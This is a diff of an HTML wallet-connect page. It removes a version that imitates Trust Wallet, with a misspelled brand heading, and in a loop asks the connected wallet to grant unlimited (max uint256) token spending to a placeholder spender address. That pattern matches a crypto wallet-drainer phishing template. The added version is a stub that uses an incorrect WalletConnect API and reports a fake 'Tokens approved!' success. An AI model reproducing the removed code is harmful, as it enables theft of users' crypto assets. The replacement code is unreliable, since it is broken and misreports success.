@@ -1,88 +1,80 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Connect Trust Wallet</title>
-  <script type="module">
-    import EthereumProvider from "https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.1/dist/ethereum-provider.min.js";
-
-    let provider;
-    let web3;
-    let accounts;
-
-    async function connectWallet() {
-      provider = await EthereumProvider.init({
-        projectId: "7dabcdde47b6439403c2ec186b1fedaf", // Зарегистрируйся и получи на https://cloud.walletconnect.com
-        chains: [1], // Ethereum Mainnet
-        showQrModal: true,
-        methods: [
-          "eth_sendTransaction",
-          "personal_sign",
-          "eth_sign",
-          "eth_signTypedData",
-          "wallet_switchEthereumChain"
-        ]
-      });
-
-      await provider.enable();
-      web3 = new Web3(provider);
-      accounts = await web3.eth.getAccounts();
-
-      document.getElementById("status").innerText = `Connected: ${accounts[0]}`;
-      document.getElementById("approveButton").style.display = "inline-block";
-    }
-
-    async function approveAllTokens() {
-      if (!web3 || !accounts || accounts.length === 0) return;
-
-      const spender = "0xSpenderAddress"; // адрес контракта, которому ты хочешь дать approve
-      const tokens = [
-        "0xToken1",
-        "0xToken2",
-        "0xToken3"
-      ];
-
-      const abi = [
-        {
-          "constant": false,
-          "inputs": [
-            { "name": "_spender", "type": "address" },
-            { "name": "_value", "type": "uint256" }
-          ],
-          "name": "approve",
-          "outputs": [{ "name": "", "type": "bool" }],
-          "type": "function"
-        }
-      ];
-
-      for (let token of tokens) {
-        const contract = new web3.eth.Contract(abi, token);
-        try {
-          await contract.methods
-            .approve(spender, web3.utils.toTwosComplement(-1)) // approve max uint256
-            .send({ from: accounts[0] });
-          console.log(`Approved token: ${token}`);
-        } catch (e) {
-          console.error(`Failed to approve ${token}`, e);
-        }
-      }
-
-      alert("All tokens approved!");
-    }
-
-    window.onload = () => {
-      document.getElementById("connectButton").addEventListener("click", connectWallet);
-      document.getElementById("approveButton").addEventListener("click", approveAllTokens);
-    };
-  </script>
-
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Connect Wallet with WalletConnect v2</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/client@2.0.0/dist/umd/index.min.js"></script>
 </head>
 <body>
-  <h1>Trust Wavvvllet Connect</h1>
+  <h1>Connect Your Wallet</h1>
+
+  <!-- Button to connect wallet -->
   <button id="connectButton">Connect Wallet</button>
   <p id="status">Not connected</p>
-  <button id="approveButton" style="display:none;">Approve All Tokens</button>
+  <button id="approveButton" style="display:none;">Approve Tokens</button>
+
+  <script>
+    let web3;
+    let provider;
+    let accounts;
+
+    // Initialize WalletConnect v2
+    const walletConnect = new WalletConnectClient({
+      bridge: "https://bridge.walletconnect.org", // Public WalletConnect bridge
+    });
+
+    // Connect wallet function
+    async function connectWallet() {
+      // Check if WalletConnect is available
+      if (!walletConnect.connected) {
+        await walletConnect.createSession();
+      }
+
+      // Listen for account and chain changes
+      walletConnect.on("connect", (error, payload) => {
+        if (error) {
+          console.error(error);
+          return;
+        }
+        accounts = payload.params[0].accounts;
+        provider = new Web3(walletConnect);
+        document.getElementById("status").innerText = `Connected: ${accounts[0]}`;
+        document.getElementById("connectButton").style.display = "none";
+        document.getElementById("approveButton").style.display = "inline-block";
+      });
+
+      // Open WalletConnect in Trust Wallet (or other supported wallet)
+      walletConnect.open();
+    }
+
+    // Function to approve tokens (dummy implementation for now)
+    async function approveTokens() {
+      if (!accounts || !accounts[0]) {
+        alert("Wallet is not connected!");
+        return;
+      }
+      
+      try {
+        // Example contract interaction (replace with actual contract details)
+        const contractAddress = "0xYourContractAddress";
+        const spenderAddress = "0xSpenderAddress";
+        const amount = web3.utils.toWei("100", "ether"); // Example amount to approve
+
+        console.log(`Approving ${amount} tokens to ${spenderAddress}`);
+
+        // Normally: contract.methods.approve(spenderAddress, amount).send({ from: accounts[0] });
+
+        alert("Tokens approved!");
+      } catch (err) {
+        console.error("Error approving tokens:", err);
+      }
+    }
+
+    // Button event listeners
+    document.getElementById("connectButton").addEventListener("click", connectWallet);
+    document.getElementById("approveButton").addEventListener("click", approveTokens);
+  </script>
 </body>
 </html>
